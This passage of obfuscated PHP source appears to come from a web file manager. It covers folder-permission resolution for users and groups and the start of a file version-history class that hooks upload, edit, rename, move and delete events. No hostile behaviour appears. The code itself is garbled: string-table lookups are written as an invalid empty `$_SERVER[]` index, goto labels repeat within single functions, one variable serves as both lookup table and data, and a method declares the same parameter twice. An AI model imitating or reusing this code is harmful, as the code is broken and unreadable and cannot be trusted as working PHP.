array_multisort($C, SORT_ASC, $Cҥ); return $Cҥ; goto C; C: } private function groupChidldAllRootSource($A٣) { $E =& $_SERVER[]; $DςƦ = Model($E[1859])->groupChildrenAll($A٣); $aƟڊ = array($E[472] => 0, $E[478] => array($E[7], $DςƦ), $E[398] => SourceModel::TYPE_GROUP); $a߄ = Model($E[790])->field($E[390])->where($aƟڊ)->select(); $a߄ = array_to_keyvalue($a߄, $E[33], $E[390]); return $a߄; } private function authTargetInfo($B) { goto E; E: $D׵Ԏ =& $_SERVER[]; $f = array(); $aۇɶ = array(); goto d; e֢: return $f; goto E; d: $dތؤ = 2 << 25; foreach ($B as $b) { goto a꫆; a꫆: $e孇 = Model($D׵Ԏ[1854])->listData($b[$D׵Ԏ[1782]]); if (!$e孇) { continue; } if ($b[$D׵Ԏ[398]] == SourceModel::TYPE_USER) { $C߹ = Model($D׵Ԏ[497])->getInfoSimpleOuter($b[$D׵Ԏ[478]]); if ($C߹[$D׵Ԏ[1523]] == $D׵Ԏ[1084]) { continue; } if ($C߹[$D׵Ԏ[1523]] == $D׵Ԏ[491]) { $C߹[$D׵Ԏ[28]] = LNG($D׵Ԏ[1860]); } } else { $C߹ = Model($D׵Ԏ[480])->getInfoSimple($b[$D׵Ԏ[478]]); } goto D; eت: $Aъ = 0; if ($b[$D׵Ԏ[398]] == SourceModel::TYPE_GROUP) { $Aъ = $dތؤ * 2; } if ($b[$D׵Ԏ[398]] == SourceModel::TYPE_USER) { $Aъ = $dތؤ; } goto D; D: if ($b[$D׵Ԏ[398]] == SourceModel::TYPE_USER && $b[$D׵Ԏ[478]] == $D׵Ԏ[491]) { $Aъ = 0; } $aۇɶ[] = $e孇[$D׵Ԏ[400]] + $Aъ; goto f؃; D: if (!$C߹) { continue; } $C߹[$D׵Ԏ[440]] = $e孇; $f[] = $C߹; goto eت; f؃: } array_multisort($aۇɶ, SORT_DESC, $f); goto e֢; E: } public function getAllChildrenByUser($C, $D) { goto eĿ; d: return $Cǳ; goto a޳; Dً: if ($f[$Cݎ[472]] == $Cݎ[491] && $f[$Cݎ[478]] != $d߂ && $this->groupContainUser($f[$Cݎ[478]], $D)) { foreach ($Bۈ[$Cݎ[1861]] as $cд) { $Bِ = Model($Cݎ[480])->getInfo($cд[$Cݎ[1686]]); $a֖ = Model($Cݎ[501])->getInfoSimpleOuter($D); $a֖[$Cݎ[440]] = $cд[$Cݎ[400]]; if (Model($Cݎ[1854])->authCheckAction($cд[$Cݎ[400]][$Cݎ[400]], $Cݎ[1706])) { continue; } $B̴Ԃ = array($Cݎ[28] => $Cݎ[1475] . $Bِ[$Cݎ[28]], $Cݎ[390] => $Bِ[$Cݎ[84]][$Cݎ[390]], $Cݎ[75] => KodIO::make($Bِ[$Cݎ[84]][$Cݎ[390]]), $Cݎ[472] => $Cݎ[491], $Cݎ[398] => $Cݎ[1015], $Cݎ[29] => $Cݎ[512], $Cݎ[489] => $Bِ[$Cݎ[485]], $Cݎ[1686] => $Bِ[$Cݎ[1686]], $Cݎ[482] => $Bِ[$Cݎ[472]], $Cݎ[1858] => array($a֖)); $E򮻌[$B̴Ԃ[$Cݎ[390]]] = $B̴Ԃ; } } $Cǳ = array(); $d׋ = $this->getAllChildren($C); goto a; eĿ: $Cݎ =& $_SERVER[]; $Bۈ = Model($Cݎ[501])->getInfo($D); if (!$D || !$C || !$Bۈ) { return array(); } goto a琈; a: foreach ($d׋ as $bϨ) { $E = !1; foreach ($bϨ[$Cݎ[1858]] as $A) { if ($A[$Cݎ[1523]]) { if ($A[$Cݎ[1523]] == $D) { $E = !0; break; } } if ($A[$Cݎ[1686]]) { if ($this->groupContainUser($A[$Cݎ[1686]], $D)) { $E = !0; break; } } } if ($E) { $Cǳ[] = $bϨ; } $CО = $bϨ[$Cݎ[390]]; if (isset($E򮻌[$CО])) { $bϨ[$Cݎ[1858]][] = $E򮻌[$CО][0]; $E򮻌[$CО] = !1; } } $E򮻌 = array_filter(array_values($E򮻌)); $Cǳ = array_merge($E򮻌, $Cǳ); goto d; a琈: $f = Model($Cݎ[1203])->sourceInfo($C); $E򮻌 = array(); $d߂ = 1; goto Dً; a޳: } public function setAllChildrenByUser($dۃ, $a, $FΏ) { $bɍ =& $_SERVER[]; $BÅ = $this->getAllChildrenByUser($dۃ, $a); if (!$FΏ || !$BÅ) { return !1; } foreach ($BÅ as $C) { $Cô = array(); foreach ($C[$bɍ[1858]] as $eѲ) { $cߢ = $eѲ[$bɍ[440]]; $B = $eѲ[$bɍ[1523]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $D԰ = $eѲ[$bɍ[1523]] ? $eѲ[$bɍ[1523]] : $eѲ[$bɍ[1686]]; if ($eѲ[$bɍ[1523]] && $eѲ[$bɍ[1523]] == $a) { continue; } $Cô[] = array($bɍ[390] => $C[$bɍ[390]], $bɍ[398] => $B, $bɍ[478] => intval($D԰), $bɍ[1782] => isset($cߢ[$bɍ[388]]) ? intval($cߢ[$bɍ[388]]) : 0, $bɍ[1836] => isset($cߢ[$bɍ[1836]]) ? intval($cߢ[$bɍ[1836]]) : -1); } $Cô[] = array($bɍ[390] => $C[$bɍ[390]], $bɍ[398] => SourceModel::TYPE_USER, $bɍ[478] => intval($a), $bɍ[1782] => intval($FΏ), $bɍ[1836] => -1); $this->where(array($bɍ[404] => $C[$bɍ[390]]))->delete(); $this->addAll($Cô); } return !0; } public function get($c܎) { $A = $this->getSourceList(array($c܎), !0); return $A[0]; } public function getSourceList($c, $E = false, $c = false) { goto B΃; bŕ: foreach ($E as $A => $B) { $c묏 = $FӼ->parentLevelArray($B[$E[481]]); $F؋ϴ = array_merge($F؋ϴ, array($A), array_reverse($c묏)); } $F؋ϴ = array_values(array_unique($F؋ϴ)); if (!$F؋ϴ) { return array(); } goto CＵ; D: $aٛ = array(); foreach ($E as $c鶱܅ => $aК) { if ($aֵ) { $aٛ[$c鶱܅] = $cߍǋ; continue; } $aٛ[$c鶱܅] = $this->makeSourceAuth($aК, $E͟, $c); } return $aٛ; goto AຏȆ; fۘ̚: $aֵ = $this->userIsRoot($c); $d = AuthModel::authAll(); $cߍǋ = array($E[401] => $d, $E[1863] => array($E[406] => 0, $E[1692] => $d, $E[407] => LNG($E[1864]), $E[1707] => $E[1865])); goto D; CＵ: $C𛞂 = $this->sourceAuthSelect($F؋ϴ); $E͟ = array(); foreach ($F؋ϴ as $c鶱܅) { if (isset($C𛞂[$c鶱܅])) { $E͟[$c鶱܅] = $C𛞂[$c鶱܅]; } } goto fۘ̚; e؇: if (!$E && count($c) == 1) { $E = array(); $E[$c[0]] = $FӼ->sourceInfo($c[0]); } if (!$E) { $b = array($E[404] => array($E[405], $c)); $E = $FӼ->field($E[1862])->where($b)->select(); $E = array_to_keyvalue($E, $E[390]); } $F؋ϴ = $c; goto bŕ; B΃: $E =& $_SERVER[]; if (!$c) { return array(); } $FӼ = Model($E[1203]); goto e؇; AຏȆ: } public function authDeepCheck($d, $B = false) { goto Cݳ; cɘ: if (!in_array($d, $Cė۽[$c쫼Ç[1866]])) { return !1; } $cՄƿ = array(); foreach ($Cė۽[$c쫼Ç[1867]] as $Eȍ => $Dʏ) { if (!in_array($d, $Dʏ)) { continue; } $cՄƿ[] = $Eȍ; } goto B; B: if (!$cՄƿ) { return !1; } $b = $cՄƿ ? $cՄƿ[0] : $d; return array($c쫼Ç[401] => -1, $c쫼Ç[440] => array($c쫼Ç[406] => $c쫼Ç[1084], $c쫼Ç[1692] => $c쫼Ç[491], $c쫼Ç[407] => LNG($c쫼Ç[1868]), $c쫼Ç[1707] => $c쫼Ç[1869]), $c쫼Ç[1870] => LNG($c쫼Ç[1871]), $c쫼Ç[1872] => $this->sourceAuthInfo($b)); goto C; Cݳ: $c쫼Ç =& $_SERVER[]; $B = $B ? $B : USER_ID; $Cė۽ = $this->makeAuthDeep($B); goto cɘ; C: } protected function makeAuthDeep($C̈́ = false) { goto F; cɩ: $CͿ = array_to_keyvalue_group($E, $Dٲ[390]); foreach ($CͿ as $E => $cĽ冞) { $E鈞ۡ = $this->authArrayCheck($cĽ冞, $C̈́); if ($E鈞ۡ[$Dٲ[401]] > 0) { $e׉̜[] = $E . $Dٲ[33]; } } $Dƛ = array(); goto dɡ; a: if ($d×) { $b = array(array($Dٲ[398] => SourceModel::TYPE_USER, $Dٲ[478] => $C̈́), array($Dٲ[398] => SourceModel::TYPE_GROUP, $Dٲ[478] => array($Dٲ[405], $d×)), $Dٲ[957] => $Dٲ[1774]); } $E = $this->field($Dٲ[1874])->where($b)->select(); $e׉̜ = array(); goto cɩ; d: $F󵼌 = array($Dٲ[1866] => $Dƛ, $Dٲ[1867] => $Fʺǳ); $bѿ[$C̈́] = $F󵼌; return $F󵼌; goto EĹ; dɡ: $B͛ = $d×; $aƂ = Model($Dٲ[1203]); $f = Model($Dٲ[480]); goto E򚏡; F: $Dٲ =& $_SERVER[]; static $bѿ = array(); $C̈́ = $C̈́ ? $C̈́ : USER_ID; goto AՍ; E򚏡: $Fʺǳ = array(); $aֵͭ = array(); $c = array(); goto d; Dܕ: foreach ($B͛ as $aʗ؈) { $aݬộ = $f->getInfo($aʗ؈); $Dƛ[] = $aݬộ[$Dٲ[84]][$Dٲ[390]]; $c[$aʗ؈] = $aݬộ[$Dٲ[84]][$Dٲ[390]]; $aŒ͢[$aʗ؈] = $aƂ->parentLevelArray($aݬộ[$Dٲ[481]]); } foreach ($Fʺǳ as $e΅ => $F˹Ж) { $Cՠ = $aֵͭ[$e΅]; if (!$Cՠ || !$c[$Cՠ]) { continue; } $b喑 = array(); foreach ($aŒ͢[$Cՠ] as $aʗ؈) { $b喑[] = $c[$aʗ؈]; } $Fʺǳ[$e΅] = array_merge($b喑, $F˹Ж); } $Dƛ = array_values(array_unique($Dƛ)); goto d; a˳: $d = $B͛; foreach ($d as $aʗ؈) { $aݬộ = $f->getInfo($aʗ؈); $bɆ = $aƂ->parentLevelArray($aݬộ[$Dٲ[481]]); $B͛ = array_merge($B͛, $bɆ); } $B͛ = array_values(array_unique($B͛)); goto Dܕ; Cَ: foreach ($Bʆ꿈 as $d) { if ($d[$Dٲ[400]] == 0 && $d[$Dٲ[1708]] == $Dٲ[86]) { $c[] = $d[$Dٲ[388]]; } } $d× = $this->userGroupParents($C̈́); $b = array($Dٲ[398] => SourceModel::TYPE_USER, $Dٲ[478] => $C̈́); goto a; d: $aŒ͢ = array(); if ($e׉̜) { $dҝ = $aƂ->where(array($Dٲ[390] => array($Dٲ[405], $e׉̜)))->select(); foreach ($dҝ as $cݕ) { $bɆ = $aƂ->parentLevelArray($cݕ[$Dٲ[481]]); $Dƛ = array_merge($Dƛ, $bɆ); $B͛[] = $cݕ[$Dٲ[478]]; $Fʺǳ[$cݕ[$Dٲ[390]]] = $bɆ; $aֵͭ[$cݕ[$Dٲ[390]]] = $cݕ[$Dٲ[478]]; } } $B͛ = array_values(array_unique($B͛)); goto a˳; AՍ: if (isset($bѿ[$C̈́])) { return $bѿ[$C̈́]; } $Bʆ꿈 = Model($Dٲ[1873])->listData(); $c = array(); goto Cَ; EĹ: } private function makeSourceAuth($d燦䭶, $d, $Bф = false) { goto D; A٧: $Dۅ = Model($bЩ[1203])->parentLevelArray($d燦䭶[$bЩ[481]]); $Dۅ = array_merge(array($d燦䭶[$bЩ[390]]), array_reverse($Dۅ)); $d舏 = !1; goto C寓; B: $e = $d燦䭶[$bЩ[398]] == SourceModel::TYPE_GROUP; $C̊ = $e ? $this->groupRootAuth($C, $Bф) : !1; if ($C̊ && Model($bЩ[1854])->authCheckAction($C̊[$bЩ[400]], $bЩ[1706])) { return $this->groupAuthInfo($C̊, $C); } goto A٧; D: $bЩ =& $_SERVER[]; $d̪ = $bЩ[86]; $C = $d燦䭶[$bЩ[478]]; goto B; CĴ: if (!$d舏) { $EɈ = Model($bЩ[480])->getInfo($C); $Cϼ؊ = explode($bЩ[47], trim($EɈ[$bЩ[481]], $bЩ[47])); $Cϼ؊ = array_reverse($Cϼ؊); foreach ($Cϼ؊ as $d) { if ($d == $bЩ[491] || $d == $d̪) { continue; } $fɹ = $this->groupRootAuth($d, $Bф); if (!$fɹ) { continue; } $d舏 = $this->groupAuthInfo($fɹ, $d); break; } } if (!$d舏 || $d舏[$bЩ[401]] <= 0) { $aԦ = $this->authDeepCheck($d燦䭶[$bЩ[390]], $Bф); if ($aԦ) { $d舏 = $aԦ; } } return $d舏; goto E߷; C寓: foreach ($Dۅ as $fː) { if (!isset($d[$fː])) { continue; } $F = $this->authMake($d[$fː], $Bф); if ($F[$bЩ[440]]) { $d舏 = $F; break; } } if (!$e) { return $d舏; } if (!$d舏 && $C̊) { $d舏 = $this->groupAuthInfo($C̊, $C); } goto CĴ; E߷: } private function userIsRoot($B = false) { $E =& $_SERVER[]; if (!$B && _get($GLOBALS, $E[479])) { return !0; } $e = Model($E[501])->getInfo($B); $DЊ = Model($E[1875])->listData($e[$E[1407]]); if ($DЊ && $DЊ[$E[1279]][$E[1876]] == 1) { return !0; } return !1; } private function sourceAuthInfo($c҇҉) { goto E; f޿: if (!$BՆ) { return !1; } $eق->groupPathDisplay($BՆ); $B = array($BՆ); goto Dż; E: $Dۃۏ =& $_SERVER[]; $eق = Model($Dۃۏ[1203]); $BՆ = $eق->sourceInfo($c҇҉); goto f޿; Cߑ͐: if (isset($BՆ[$Dۃۏ[486]])) { $FÆ = explode($Dۃۏ[8], trim($BՆ[$Dۃۏ[489]], $Dۃۏ[8])); array_shift($FÆ); $eט = $BՆ[$Dۃۏ[484]] . $Dۃۏ[1877] . implode($Dۃۏ[8], $FÆ); } return array($Dۃۏ[407] => $BՆ[$Dۃۏ[28]], $Dۃۏ[75] => KodIO::make($BՆ[$Dۃۏ[390]]), $Dۃۏ[1878] => $eט); goto B; Dż: $B = $eق->_listAppendPath($B); $BՆ = $B[0]; $eט = $BՆ[$Dۃۏ[489]]; goto Cߑ͐; B: } private function groupAuthInfo($Fƃ, $A鳔) { $b =& $_SERVER[]; $e־ = Model($b[480])->getInfo($A鳔); return array($b[1879] => intval($Fƃ[$b[400]]), $b[1863] => $Fƃ, $b[1880] => LNG($b[1881]), $b[1872] => array($b[407] => $e־[$b[28]], $b[75] => KodIO::make($e־[$b[84]][$b[390]]), $b[1878] => $e־[$b[485]])); } protected function groupRootAuth($e֑, $E = false) { goto d鮄; d鮄: $aÝ =& $_SERVER[]; $E = $E ? $E : USER_ID; $D܋ױ = $E . $aÝ[1882] . $e֑; goto fʬ; f: $AǙΏ횮 = $this->userGroupList($E); $E = isset($AǙΏ횮[$e֑]) ? $AǙΏ횮[$e֑][$aÝ[400]] : !1; if ($E && Model($aÝ[1854])->authCheckAction($E[$aÝ[400]], $aÝ[1706])) { $bֆ֐[$D܋ױ] = $E; return $E; } goto f; F܈΍: $bֆ֐[$D܋ױ] = $d ? $d : $E; return $bֆ֐[$D܋ױ]; goto AΙ; fʬ: static $bֆ֐ = array(); if (isset($bֆ֐[$D܋ױ])) { return $bֆ֐[$D܋ױ]; } $Dȹ = Model($aÝ[480])->getInfo($e֑); goto f; f: $Aߡ = $this->sourceAuthSelect($Dȹ[$aÝ[84]][$aÝ[390]]); $BӴ = $Aߡ ? $this->authMake($Aߡ, $E) : !1; $d = $BӴ ? $BӴ[$aÝ[440]] : !1; goto F܈΍; AΙ: } public function authOwnerApply($A) { goto c򍎻; c򍎻: $d퍂 =& $_SERVER[]; if (empty($A[$d퍂[400]]) || isset($A[$d퍂[1883]]) && $A[$d퍂[1883]]) { return $A; } if (AuthModel::authCheckRoot($A[$d퍂[400]][$d퍂[401]])) { return $A; } goto a; a: $a펄۱ = Model($d퍂[1203])->parentLevelArray($A[$d퍂[481]]); $a펄۱ = array_merge(array($A[$d퍂[390]]), array_reverse($a펄۱)); $e񜍣 = $this->sourceAuthSelect($a펄۱); goto aϋ; aϋ: $E = array(); $Cƙ = array(); foreach ($e񜍣 as $d̋ => $f) { $C➩Ε = $this->authFolderOwnerUser($f); $E[$d̋] = $C➩Ε; $Cƙ = array_merge($Cƙ, $C➩Ε[$d퍂[557]]); if ($C➩Ε[$d퍂[1884]]) { break; } } goto e; b: $A[$d퍂[400]][$d퍂[1885]] = Model($d퍂[497])->userListInfo($Cƙ); return $A; goto f㺿Ȓ; e: if (count($Cƙ) == 0) { $Cƙ = $this->authFolderOwnerGroup($A[$d퍂[478]]); } $Cƙ = array_unique($Cƙ); if (AuthModel::authCheckRoot($A[$d퍂[400]][$d퍂[401]])) { $Cƙ[] = USER_ID; } goto b; f㺿Ȓ: } private function authFolderOwnerGroup($BÖЦ) { $Fɧ =& $_SERVER[]; $cÝ = Model($Fɧ[1768])->where(array($Fɧ[1686] => $BÖЦ))->select(); $a = array(); if (!$cÝ) { return $a; } foreach ($cÝ as $E왻) { $BӒ = $this->authInfo($E왻); if (AuthModel::authCheckRoot($BӒ[$Fɧ[400]])) { $a[] = $E왻[$Fɧ[1523]]; } } return $a; } private function authFolderOwnerUser($d) { $C =& $_SERVER[]; $f¶ = array(); $b̸ = !1; foreach ($d as $A⏤) { $fཤ = $this->authInfo($A⏤); if ($A⏤[$C[478]] == $C[491]) { $b̸ = !0; } if ($A⏤[$C[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($fཤ[$C[400]])) { $f¶[] = $A⏤[$C[478]]; } } } return array($C[557] => $f¶, $C[1884] => $b̸); } public function authMake($fޮ͚, $fѳ = false) { $E삘 =& $_SERVER[]; $E = $this->authArrayCheck($fޮ͚, $fѳ); if ($E[$E삘[1886]]) { $E[$E삘[1886]] = $this->sourceAuthInfo($E[$E삘[1886]]); } return $E; } public function authArrayCheck($f랼, $FҺ = false) { goto E۪®; Bޭ: $AŃ = 0; $F䋏½ = 0; $aգ¼ = 0; goto Aۡ; Aۡ: $a̙ = 1000; $B珩ݣ = 0; $fϟ۽ = 0; goto F녈; F: $F䙚 = 0; $b = 0; $aل = 0; goto Bޭ; E۪®: $cΧ =& $_SERVER[]; if (!$f랼) { return array($cΧ[401] => 0, $cΧ[440] => !1); } $FҺ = $FҺ ? $FҺ : USER_ID; goto F; F녈: $D럇 = 0; $aӆ􆥳 = 0; $Fާψ = array($cΧ[390] => 0); goto CŹ; bՌ샴: return $aЙ; goto fێԠ; CŹ: foreach ($f랼 as $Fާψ) { $b©؇ = $this->authInfo($Fާψ); if (!$b©؇) { continue; } $dğ = $Fާψ[$cΧ[478]]; $Aփ = intval($b©؇[$cΧ[400]]); if ($Fާψ[$cΧ[398]] == SourceModel::TYPE_USER && $dğ == $FҺ) { $F䙚 = !0; $aل = $b©؇; $b = $Aփ; } else { if ($Fާψ[$cΧ[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($dğ, $FҺ)) { $AŃ = !0; $C = $this->groupStepToUserGroup($dğ, $FҺ); if ($C < $a̙) { $a̙ = $C; $F䋏½ = $Aփ; $aգ¼ = $b©؇; $B珩ݣ = $dğ; } if ($C == $a̙ && $Aփ >= $F䋏½) { $F䋏½ = $Aփ; $aգ¼ = $b©؇; $B珩ݣ = $dğ; } } else { if ($dğ == $cΧ[491]) { $fϟ۽ = !0; $aӆ􆥳 = $b©؇; $D럇 = $Aփ; } } } } if ($F䙚) { $f͵䰆 = $b; $b©؇ = $aل; $aע = LNG($cΧ[1887]); } else { if ($AŃ) { $f͵䰆 = $F䋏½; $b©؇ = $aգ¼; $eۯ = Model($cΧ[480])->getInfo($B珩ݣ); $aע = $cΧ[159] . $eۯ[$cΧ[485]] . $cΧ[1888] . LNG($cΧ[1889]); } else { if ($fϟ۽) { $f͵䰆 = $D럇; $b©؇ = $aӆ􆥳; $aע = LNG($cΧ[1860]); } else { $f͵䰆 = 0; $b©؇ = !1; $aע = $cΧ[33]; } } } $aЙ = array($cΧ[1879] => intval($f͵䰆), $cΧ[1863] => $b©؇, $cΧ[1880] => $aע, $cΧ[1872] => $Fާψ[$cΧ[390]]); goto bՌ샴; fێԠ: } private function groupContainUser($BՈ؃, $BԂ = false) { return in_array($BՈ؃, $this->userGroupParents($BԂ)); } private function groupStepToUserGroup($E˾, $e = false) { goto E榵; b: $dں = $GLOBALS[$Aũ[6]][$Aũ[87]][$Aũ[1779]] == 1; $Bś = $dں ? 3 : 2; foreach ($eߌ烤 as $B秡) { if ($B秡[$Aũ[1686]] == $E˾) { return 0; } $a = explode($Aũ[47], trim($B秡[$Aũ[481]], $Aũ[47])); if ($a[0] == $Aũ[491] && count($a) > $Bś) { $C = array_reverse(array_slice($a, $Bś)); $C߶ݚ = array_search($E˾, $C); if ($C߶ݚ !== !1 && $C߶ݚ + 1 <= $F긻) { $F긻 = $C߶ݚ + 1; } } } goto EǄ; EǄ: return $F긻; goto aĬ; E榵: $Aũ =& $_SERVER[]; $eߌ烤 = $this->userGroupList($e); $F긻 = 1000; goto b; aĬ: } private function userGroupList($Eʝɯ = false) { $b =& $_SERVER[]; static $aԗ = array(); if (isset($aԗ[$Eʝɯ])) { return $aԗ[$Eʝɯ]; } $Aס֟ = Model($b[501])->getInfo($Eʝɯ); $aԗ[$Eʝɯ] = array_to_keyvalue($Aס֟[$b[1861]], $b[1686]); return $aԗ[$Eʝɯ]; } public function userGroupParents($B) { goto D诼; D诼: $f۹ =& $_SERVER[]; static $cߥ = array(); $B = $B ? $B : USER_ID; goto CИ; c՗: $B = $GLOBALS[$f۹[6]][$f۹[87]][$f۹[1779]] == 1; $F = $B ? 3 : 2; foreach ($f as $b뜢) { $fŊ = array($b뜢[$f۹[1686]]); $c = explode($f۹[47], trim($b뜢[$f۹[481]], $f۹[47])); if ($c[0] == $f۹[491] && count($c) > $F) { $B = array_slice($c, $F); $fŊ = array_merge($fŊ, array_reverse($B)); } $c = array_merge($c, $fŊ); } goto F܌Ϲ; CИ: if (isset($cߥ[$B])) { return $cߥ[$B]; } $f = $this->userGroupList($B); $c = array(); goto c՗; F܌Ϲ: $cߥ[$B] = array_unique($c); return $cߥ[$B]; goto a; a: } public function authTargetInfoMake($e) { goto b➾; eޅ: return array($fǑ[1891] => $FМ, $fǑ[1892] => $B̬); goto F; b➾: $fǑ =& $_SERVER[]; $FМ = array(); $B̬ = array(); goto f; f: foreach ($e as $Eλب) { if ($Eλب[$fǑ[398]] == SourceModel::TYPE_USER) { $FМ[] = intval($Eλب[$fǑ[478]]); } else { if ($Eλب[$fǑ[398]] == SourceModel::TYPE_GROUP) { $B̬[] = intval($Eλب[$fǑ[478]]); } } } if ($FМ) { $FМ = Model($fǑ[497])->userListInfo($FМ); } if ($B̬) { $d뎤 = array($fǑ[1765] => array($fǑ[405], $B̬)); $B̬ = Model($fǑ[480])->field($fǑ[1890])->where($d뎤)->select(); $B̬ = array_to_keyvalue($B̬, $fǑ[1686]); } goto eޅ; F: } public function authInfo($b) { $e =& $_SERVER[]; if ($b[$e[1782]]) { $D = Model($e[1854])->listData($b[$e[1782]]); if (!$D) { return !1; $E = Model($e[1854])->listData(); $Fᨸ = array_filter_by_field($E, $e[400], $e[491]); return $Fᨸ; } $a = array_field_key($D, array($e[388], $e[28], $e[400], $e[1707], $e[1709])); $a[$e[1893]] = $b; return $a; } else { return array($e[406] => 0, $e[1692] => $b[$e[1836]], $e[407] => $e[33], $e[1707] => $e[1894]); } } } goto fʹ烏; A،: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto CԈ; CԈ: $b =& $_SERVER[]; $Cײ = $GLOBALS[$b[6]][$b[87]][$b[1102]]; if ($Cײ <= 0) { return; } goto c; CԹ: Hook::bind($b[1114], $b[1115]); goto eՍ; bƎ: Hook::bind($b[1108], $b[1109]); Hook::bind($b[1110], $b[1111]); Hook::bind($b[1112], $b[1113]); goto CԹ; c: if (isset($_REQUEST[$b[1103]]) && $_REQUEST[$b[1103]] == $b[86]) { return; } Hook::bind($b[1104], $b[1105]); Hook::bind($b[1106], $b[1107]); goto bƎ; eՍ: } public static function eventBeforeUpload($e) { if ($e[3] && $e[3] != REPEAT_REPLACE) { return; } $Eϲ = self::parsePath($e[0]); if (!$Eϲ) { return; } self::add($Eϲ); } public static function eventBeforeEdit($E鿘) { $bӧ = self::parsePath($E鿘[0]); if (!$bӧ) { return; } self::add($bӧ); } public static function eventBeforeCopyFile($DƂ, $E՛, $e񂕑̛, $fӊݟ, $A㍄, $B) { $b򯏑 = $e񂕑̛->getPathOuter($fӊݟ); $C = self::parsePath($b򯏑); if (!$C) { return; } self::add($C); } public static function eventBeforeRename($Fؽ㊎) { $A肜 =& $_SERVER[]; $b = self::parsePath($Fؽ㊎[0]); if (!$b) { return; } $FÈĶ = self::checkInHistory($b); if (!$FÈĶ) { return; } if ($FÈĶ[$A肜[29]] == $A肜[173]) { $Bۉ = self::listData($b); if ($Bۉ && $Bۉ[$A肜[365]]) { self::moveHistory($b, $Fؽ㊎[1]); } } else { IO::rename($FÈĶ[$A肜[75]], $Fؽ㊎[1]); } } public static function eventBeforeMove($Fҝם) { goto e˒܏; Bү: if ($b[$C睭[29]] == $C睭[173]) { $Eҷϋ = self::listData($c); $E = rtrim($dմ, $C睭[8]) . $C睭[8] . ($f֝ϫ ? $f֝ϫ : get_path_this($c)); $c剭 = self::listData($E); if ($Eҷϋ && $Eҷϋ[$C睭[365]] && $c剭 && $c剭[$C睭[365]]) { return self::clear($c); } if ($Eҷϋ && $Eҷϋ[$C睭[365]]) { self::moveHistory($c, $f֝ϫ, $FȬԜ); } } else { IO::move($b[$C睭[75]], $FȬԜ, !1, $f֝ϫ); self::clearEmptyFolder(IO::pathFather($b[$C睭[75]])); } goto c򅈢; e˒܏: $C睭 =& $_SERVER[]; $c = self::parsePath($Fҝם[0]); if (!$c) { return; } goto aԉ; e𿢘: $b = self::checkInHistory($c); if (!$b) { return; } $FȬԜ = self::pathHistory($dմ); goto Bү; aԉ: $dմ = self::parsePath($Fҝם[1]); if (!$dմ) { return; } $f֝ϫ = $Fҝם[3]; goto e𿢘; c򅈢: } public static function eventAfterRemove($AƩ, $eۍ) { goto e҉; e҉: $Bͅا =& $_SERVER[]; if (!$eۍ) { return; } $A銞 = self::parsePath($AƩ[0]); goto E; E: if (!$A銞) { return; } $E = self::checkInHistory($A銞); if (!$E) { return; } goto a那; a那: if ($E[$Bͅا[29]] == $Bͅا[173]) { $Aࡌ = self::listData($A銞, !1); if ($Aࡌ && $Aࡌ[$Bͅا[365]]) { self::clear($A銞, !1); } } else { IO::remove($E[$Bͅا[75]]); self::clearEmptyFolder(IO::pathFather($E[$Bͅا[75]])); } goto AՄ; AՄ: } private static function checkInHistory($E˷) { $A׬ҭ = self::pathHistory($E˷); if (!IO::exist($A׬ҭ)) { $A׬ҭ .= $_SERVER[][1116]; } return IO::exist($A׬ҭ) ? IO::info($A׬ҭ) : !1; } private static function parsePath($B) { goto c; c: $D݋ =& $_SERVER[]; if (!$B) { return !1; } if ($GLOBALS[$D݋[1117]]) { return; } goto CĆ; CĆ: $f = KodIO::parse($B); $d = $f[$D݋[29]]; $e = !$d || $d == KodIO::KOD_IO || $d == KodIO::KOD_SHARE_ITEM; goto BՐ덍; Dǲݹ: $Eҍ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $D݋[1119]); foreach ($Eҍ as $E) { if (!$d && substr($B, 0, strlen($E)) == $E) { return !1; } } self::log($GLOBALS[$D݋[1042]] . $D݋[1120] . $B); goto Eﰐמ; BՐ덍: if (!$e || !$f[$D݋[1118]]) { return !1; } if ($d == KodIO::KOD_SHARE_ITEM) { $Aۑ҄ = IO::init($B); if ($Aۑ҄->pathParse[$D݋[1047]]) { return self::parsePath($Aۑ҄->pathParse[$D݋[1047]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto Dǲݹ; Eﰐמ: return $B; goto B; B: } private static function pathHistory($bӉ) { $EҍՔ =& $_SERVER[]; $cЍ = self::$_historyBase . ltrim(KodIO::clear($bӉ), $EҍՔ[8]); $cЍ = str_replace(array($EҍՔ[1121]), array($EҍՔ[1122]), $cЍ); return $cЍ; } public static function log($d᪦Ј) { } public static function historyCount($cڕ) { $bܦМ =& $_SERVER[]; $F͏ = array(); $Bĸ = array(); foreach ($cڕ as $dǔ) { $Eۺ = get_path_father($dǔ); if (!$Bĸ[$Eۺ]) { $Bĸ[$Eۺ] = array(); } $Bĸ[$Eۺ][] = get_path_this($dǔ); } foreach ($Bĸ as $Eۺ => $A) { $E = self::parsePath($Eۺ); if (!$E) { continue; } foreach ($A as $d̂׎) { $b͝ǹ = self::listData(rtrim($E, $bܦМ[8]) . $bܦМ[8] . $d̂׎, !1); if ($b͝ǹ && $b͝ǹ[$bܦМ[365]]) { $F͏[rtrim($Eۺ, $bܦМ[8]) . $bܦМ[8] . $d̂׎] = count($b͝ǹ[$bܦМ[365]]); } } } return $F͏; } public static function add($Cڞɽ) { goto f; b򠋲: if ($e <= 0) { return; } $Cᆘ = IO::hashSimple($Cڞɽ); $A酭 = IO::info($Cڞɽ); goto AƯ; DɄ: $Dׅ = array($E鰌[388] => $b, $E鰌[170] => $Cᆘ, $E鰌[28] => $A酭[$E鰌[28]] . $E鰌[94] . date($E鰌[1126]) . rand_string(1), $E鰌[77] => $A酭[$E鰌[77]], $E鰌[426] => USER_ID, $E鰌[192] => time(), $E鰌[1127] => $E鰌[33]); IO::mkdir($C[$E鰌[1128]]); $A孒 = IO::copy($Cڞɽ, $C[$E鰌[1128]], !1, $Dׅ[$E鰌[28]]); goto fÎ; a: $b؝ = Model($E鰌[1123])->get($E鰌[1124]); $e = $GLOBALS[$E鰌[6]][$E鰌[87]][$E鰌[1102]]; $dЍۊ = $b؝ == $E鰌[1125] ? 5 : $e; goto b򠋲; fÎ: if (!$A孒) { self::clearEmptyFolder($C[$E鰌[1128]]); return !1; } array_unshift($Eك, $Dׅ); if 